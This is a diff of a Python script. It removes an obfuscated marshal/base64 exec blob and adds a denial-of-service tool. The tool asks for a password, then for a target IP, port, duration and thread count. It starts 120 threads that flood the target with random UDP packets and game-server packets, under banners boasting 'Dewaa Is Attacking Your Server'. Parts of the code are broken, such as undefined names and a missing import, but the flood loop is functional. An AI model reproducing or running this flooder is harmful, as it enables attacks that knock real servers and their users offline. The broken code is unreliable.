@@ -1,4 +1,242 @@
-#MAU RENAME YA DEK?
-#SUBS YT GW SH1NCI
-import marshal, zlib, base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+import socket, struct, codecs, sys, threading, random, time, os
+username1 = "Owner"
+password1 = "2107"
+username = str(input("\033[97mUsername:"))
+password = str(input("\033[91mPassword:"))
+if password == f"{password1}" and username == f"{username1}":
+    print (f"Connect As {username}")
+    time.sleep(3)
+
+else:
+    print (f"The password you entered is wrong Password You Input: {password}")
+    exit()
+
+os.system("clear")
+Pacotes = [
+ codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
+ codecs.decode('53414d509531e1a9611e63', 'hex_codec'),
+ codecs.decode('53414d509531e1a9611e69', 'hex_codec'),
+ codecs.decode('53414d509531e1a9611e72', 'hex_codec'),
+ codecs.decode('081e62da', 'hex_codec'),
+ codecs.decode('081e77da', 'hex_codec'),
+ codecs.decode('081e4dda', 'hex_codec'),
+ codecs.decode('021efd40', 'hex_codec'),
+ codecs.decode('081e7eda', 'hex_codec')]
+
+
+referers = [
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa'
+     'Your_Server_Bypassed_By_Dewaa'
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa',
+     'Your_Server_Bypassed_By_Dewaa'
+     'Your_Server_Bypassed_By_Dewaa']
+
+refers = [
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa'
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa',
+     'ANTIDDOS_BYPASSED_BY_Dewaa']
+
+os.system("clear")
+print("""\033[91m
+ ________________$$$$$
+ ______________$$____$$
+ ______________$$____$$
+ ______________$$____$$
+ ______________$$____$$
+ ______________$$____$$
+ __________$$$$$$____$$$$$$
+ ________$$____$$____$$____$$$$
+ ________$$____$$____$$____$$__$$
+ $$$$$$__$$____$$____$$____$$____$$
+ $$____$$$$________________$$____$$
+ $$______$$______________________$$
+ __$$____$$______________________$$
+ ___$$$__$$______________________$$
+ ____$$__________________________$$
+ _____$$$________________________$$
+ ______$$______________________$$$
+ _______$$$____________________$$
+ ________$$____________________$$
+ _________$$$________________$$$
+ __________$$________________$$
+ __________$$$$$$$$$$$$$$$$$$$$
+""")
+print("@++ExT-Dewaa")
+print("\033[95mIP HOST")
+ip = str(input("╚══> "))
+print("\033[95mPORT HOST")
+port = int(input("╚══> "))
+print("\033[95mDURATION INPUT")
+times = int(input("╚══> "))
+print("\033[95mTHREADS INPUT")
+threads = int(input("╚══> "))
+
+os.system("clear")
+print ("[38;2;255;0;255m═[38;2;249;6;255m═[38;2;243;12;255m═[38;2;237;18;255m═[38;2;231;24;255m═[38;2;225;30;255m═[38;2;219;36;255m═[38;2;213;42;255m═[38;2;207;48;255m═[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═[38;2;51;204;255m═[38;2;45;210;255m═[38;2;39;216;255m═[38;2;33;222;255m═[38;2;27;228;255m═[38;2;21;234;255m")
+print ("[38;2;255;0;255m║ [1;37mATTACKING SENT")
+print ("[38;2;255;0;255m═[38;2;249;6;255m═[38;2;243;12;255m═[38;2;237;18;255m═[38;2;231;24;255m═[38;2;225;30;255m═[38;2;219;36;255m═[38;2;213;42;255m═[38;2;207;48;255m═[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═[38;2;51;204;255m═[38;2;45;210;255m═[38;2;39;216;255m═[38;2;33;222;255m═[38;2;27;228;255m═[38;2;21;234;255m")
+print ("[38;2;255;0;255m║ [38;2;255;0;255mI[38;2;219;36;255mP[38;2;183;72;255mH[38;2;147;108;255mO[38;2;111;144;255mS[38;2;75;180;255mT[38;2;39;216;255m     [1;31m: [1;34m[[1;32m%s[1;34m] "%(ip))
+print ("[38;2;255;0;255m║ [38;2;255;0;255mP[38;2;204;51;255mO[38;2;153;102;255mR[38;2;102;153;255mT[38;2;51;204;255m       [1;31m: [1;34m[[1;32m%s[1;34m]"%(port))
+print ("[38;2;255;0;255m║ [38;2;255;0;255mM[38;2;219;36;255mE[38;2;183;72;255mT[38;2;147;108;255mH[38;2;111;144;255mO[38;2;75;180;255mD[38;2;39;216;255m     [1;31m: [1;34m[[1;32mUDP[1;34m] ")
+print (f"[38;2;255;0;255m║ [38;2;255;0;255mD[38;2;227;28;255mU[38;2;199;56;255mR[38;2;171;84;255mA[38;2;143;112;255mT[38;2;115;140;255mI[38;2;87;168;255mO[38;2;59;196;255mN[38;2;31;224;255m   [1;31m: [1;34m[[1;32m{times}[1;34m] ")
+print ("[38;2;255;0;255m║ [38;2;255;0;255mE[38;2;230;25;255mX[38;2;205;50;255mT[38;2;180;75;255m [38;2;155;100;255mN[38;2;130;125;255mI[38;2;105;150;255mT[38;2;80;175;255mR[38;2;55;200;255mO[38;2;30;225;255m  [1;31m: [1;34m(16GBPS[1;34m) ")
+print ("[38;2;255;0;255m═[38;2;249;6;255m═[38;2;243;12;255m═[38;2;237;18;255m═[38;2;231;24;255m═[38;2;225;30;255m═[38;2;219;36;255m═[38;2;213;42;255m═[38;2;207;48;255m═[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═[38;2;51;204;255m═[38;2;45;210;255m═[38;2;39;216;255m═[38;2;33;222;255m═[38;2;27;228;255m═[38;2;21;234;255m ")
+print("""
+      [38;2;243;12;255m       † Exaults Tech †
+      [38;2;243;12;255m     Dewaa Is Attacking Your Server
+      [38;2;243;12;255m         Fuck Imaging
+""")
+def randomip():
+  randip = []
+  randip1 = random.randint(1,255)
+  randip2 = random.randint(1,255)
+  randip3 = random.randint(1,255)
+  randip4 = random.randint(1,255)
+  randip5 = random.randint(1,255)
+  randip6 = random.randint(1,255)
+  randip7 = random.randint(1,255)
+  randip8 = random.randint(1,255)
+  
+  randip.append(randip1)
+  randip.append(randip2)
+  randip.append(randip3)
+  randip.append(randip4)
+  randip.append(randip5)
+  randip.append(randip6)
+  randip.append(randip7)
+  randip.append(randip8)
+
+  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
+  return(randip)
+
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    addr[4] = str(random.randrange(2, 256))
+    addr[5] = str(random.randrange(2, 254))
+    addr[6] = str(random.randrange(2, 256))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
+    return assemebled
+
+def getproxy():
+    global proxies
+    f = open(f'{nprox}.txt','wb')
+    r = requests.get(urlproxy)
+    f.write(r.content)
+    f.close()
+    proxies = open(f'{nprox}.txt').readlines()
+
+def proxyask():
+    global urlproxy
+    pro = input(f'[~] Get New List {nprox} [Y] : ')
+    if pro == "Y":
+        urlproxy = "https://www.proxy-list.download/api/v1/get?type=socks5"
+        urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=5000&country=all&ssl=yes&anonymity=all"
+        getproxy()
+        askthreads()
+    else:
+        proxyask()  
+
+class MyThread(threading.Thread):
+
+    def run(self):
+        while True:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            bytes = random._urandom(577)
+            pack = random._urandom(666)
+            go = os.urandom(min(577,577,577,577,655,577,577,616))
+            msg = Pacotes[random.randrange(0, 1)]
+            sock.sendto(bytes, (ip, int(port)))
+            sock.sendto(times, (ip, int(port)))
+            sock.sendto(threads, (ip, int(port)))
+            sock.sendto(go, (ip, int(port)))
+            sock.sendto(go, (ip, int(port)))
+            sock.sendto(go, (ip, int(port)))
+            sock.sendto(go, (ip, int(port)))
+            sock.sendto(go, (ip, int(port)))
+            sock.sendto(pack, (ip, int(port)))
+            sock.sendto(msg, (ip, int(port)))
+            if int(port) == 7777:
+                sock.sendto(Pacotes[5], (ip, int(port)))
+            elif int(port) == 7796:
+                sock.sendto(Pacotes[4], (ip, int(port)))
+            elif int(port) == 7771:
+                sock.sendto(Pacotes[6], (ip, int(port)))
+            elif int(port) == 7784:
+                sock.sendto(Pacotes[7], (ip, int(port)))
+            elif int(port) == 7785:
+                sock.sendto(Pacotes[8], (ip, int(port)))
+                
+if __name__ == '__main__':
+    try:
+        for x in range(120):
+            mythread = MyThread()
+            mythread.start()
+            time.sleep(.1)
+
+    except KeyboardInterrupt:
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print ("stopees")
+        print ('\n\n')
+        print ('STOP TO ATTACK {}').format(orgip)
